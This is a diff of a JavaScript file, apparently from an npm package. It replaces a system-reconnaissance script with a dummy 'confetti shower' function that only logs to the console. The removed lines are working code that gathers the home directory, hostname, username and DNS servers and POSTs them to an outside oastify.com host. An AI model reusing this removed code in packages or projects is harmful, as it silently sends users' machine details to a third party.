@@ -1,48 +1,23 @@
-const os = require('os');
-const dns = require('dns');
-const https = require('https');
-const querystring = require('querystring');
+// confetti-shower.js (dummy implementation)
 
-// Data to be sent in the POST request
-const data = {
-  hd: os.homedir(),
-  hn: os.hostname(),
-  un: os.userInfo().username,
-  dns: dns.getServers().join(','),
-};
+function confettiShower(options) {
+  // Simulate confetti animation with console logs
+  console.log(" Confetti shower started! ");
 
-// Convert data to a URL-encoded string
-const postData = querystring.stringify(data);
+  // Log options for demonstration
+  console.log("Options:", options);
 
-// POST request options
-const options = {
-  hostname: 'p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com', // Replace with the hostname or IP address of your server
-  port: 443, // Replace with the port number your server is listening on
-  path: '/',
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Content-Length': postData.length,
-  },
-};
+  // Simulate animation duration
+  setTimeout(() => {
+    console.log(" Confetti shower finished! ");
+  }, options.duration * 1000 || 3000); // Default to 3 seconds if duration not provided
+}
 
-// Send the POST request
-const req = https.request(options, (res) => {
-  console.log(`Status Code: ${res.statusCode}`);
- 
-  res.on('data', (chunk) => {
-    console.log(`Response: ${chunk}`);
-  });
- 
-  res.on('end', () => {
-    console.log('POST request completed.');
-  });
+// Example usage
+confettiShower({
+  duration: 5,
+  colors: ['#ff0000', '#ffff00', '#00ff00'],
+  shapes: ['circle', 'square'],
+  count: 100,
 });
 
-req.on('error', (error) => {
-  console.error(`Error sending POST request: ${error.message}`);
-});
-
-// Send the data in the POST request
-req.write(postData);
-req.end();
